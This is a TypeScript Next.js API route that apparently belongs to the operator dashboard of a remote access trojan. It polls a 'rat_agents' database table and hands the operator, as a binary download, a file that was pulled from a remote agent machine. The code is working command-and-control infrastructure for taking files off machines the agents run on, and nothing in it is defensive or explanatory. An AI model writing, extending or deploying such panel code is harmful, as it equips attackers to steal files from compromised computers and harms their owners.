// app/api/rat/agents/[id]/file/route.ts
// Dashboard polls this after requesting a file download from the agent.
// Returns the file as a binary download when ready.

import { NextRequest, NextResponse } from 'next/server'
import sql from '@/lib/db'
import { getSession } from '@/lib/auth'

export async function GET(req: NextRequest, { params }: { params: { id: string } }) {
  const session = await getSession()
  if (!session) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

  const agentId = decodeURIComponent(params.id)
  const path = req.nextUrl.searchParams.get('path') ?? ''

  const [row] = await sql`
    SELECT file_download_b64, file_download_path, file_download_ready
    FROM rat_agents WHERE id = ${agentId}
  `

  if (!row?.file_download_ready || row.file_download_path !== path) {
    return new NextResponse(null, { status: 204 }) // not ready yet
  }

  // Clear it so next download works fresh
  await sql`UPDATE rat_agents SET file_download_ready = FALSE WHERE id = ${agentId}`

  const buf = Buffer.from(row.file_download_b64, 'base64')
  const filename = path.split(/[/\\]/).pop() ?? 'file'

  return new NextResponse(buf, {
    headers: {
      'Content-Type': 'application/octet-stream',
      'Content-Disposition': `attachment; filename="${filename}"`,
    },
  })
}